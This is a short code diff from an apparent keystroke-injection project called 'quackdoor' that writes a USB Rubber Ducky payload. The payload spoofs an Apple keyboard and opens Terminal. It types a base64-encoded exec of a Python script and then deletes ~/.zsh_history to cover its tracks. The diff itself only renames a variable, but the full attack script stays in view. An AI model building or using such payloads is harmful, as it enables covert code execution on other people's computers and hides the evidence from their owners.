@@ -28,7 +28,7 @@ def flatten_to_base64_exec(input_path):
 
 flattened_b64 = flatten_to_base64_exec("quackdoor/eggsecutor/eggsecutor.py")
 
-script_template = f"ID 05ac:021e Apple:Keyboard\nDELAY 300\nGUI SPACE\nDELAY 500\nSTRING terminal.app\nDELAY 1000\nENTER\nDELAY 1500\nSTRING cd ~\nENTER\nDELAY 1000\n{PIP_LINE}STRING {flattened_b64}\nENTER\nDELAY 2000\nSTRING clear\nENTER\nDELAY 1000\nSTRING rm ~/.zsh_history\nENTER\nDELAY 1000\nGUI q\nDELAY 250"
+script = f"ID 05ac:021e Apple:Keyboard\nDELAY 300\nGUI SPACE\nDELAY 500\nSTRING terminal.app\nDELAY 1000\nENTER\nDELAY 1500\nSTRING cd ~\nENTER\nDELAY 1000\n{PIP_LINE}STRING {flattened_b64}\nENTER\nDELAY 2000\nSTRING clear\nENTER\nDELAY 1000\nSTRING rm ~/.zsh_history\nENTER\nDELAY 1000\nGUI q\nDELAY 250"
 
 with open(f"quackdoor/hatchery/{PAYLOAD_NAME}", "w") as f:
-    f.write(script_template)
+    f.write(script)
